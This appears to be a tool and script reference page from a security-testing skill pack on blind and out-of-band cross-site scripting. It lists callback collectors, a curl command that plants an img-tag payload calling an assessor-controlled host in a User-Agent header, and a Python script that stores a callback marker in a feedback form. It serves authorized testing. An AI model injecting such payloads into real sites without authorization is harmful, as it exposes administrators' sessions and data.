# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`cross-site-scripting-blind-and-oob-xss`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `XSS Hunter Express` | `self-hosted collector listening for correlated blind-XSS callbacks` | Receive and correlate per-record callbacks fired from privileged render paths | Cross-platform |
| `interactsh-client` | `interactsh-client -v` | Capture DNS and HTTP callbacks with the originating address to confirm an out-of-band render | Cross-platform |
| `curl` | `curl -sS -A '<img src=https://assessor.test/bxss/case-a1 >' https://target.example/track` | Seed a header-sourced field that later renders in a privileged viewer | Cross-platform |

## Minimal Script Shape

A stored-marker registrar: it submits an inert correlated marker and records the callback URL to watch, so a later hit from the privileged viewer confirms blind execution.

```python
import json
import urllib.request

STORE = "https://target.example/feedback"
CALLBACK = "https://<assessor-controlled-host>/bxss/case-a1"

def submit(comment):
    data = json.dumps({"comment": comment}).encode()
    req = urllib.request.Request(STORE, data=data,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as r:
        return r.status

# the marker is inert text here; confirmation is a later callback from the admin render
marker = "blind case-a1 beacon " + CALLBACK
status = submit(marker)
print({"stored_status": status, "callback_to_watch": CALLBACK,
       "verdict": "await out-of-band hit from the privileged viewer"})
```
